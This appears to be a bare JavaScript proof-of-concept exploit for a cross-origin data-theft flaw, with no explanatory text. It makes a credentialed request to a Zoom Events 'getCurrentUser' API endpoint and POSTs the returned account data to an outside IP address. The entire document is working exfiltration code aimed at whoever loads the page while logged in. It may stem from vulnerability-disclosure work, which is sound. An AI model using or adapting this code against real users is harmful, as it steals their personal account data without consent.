var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    for(let i = 0; i < 2; i++){
        fetch('http://164.92.231.31/', {
            method: 'POST',
            body: this.responseText
        });
    }
};
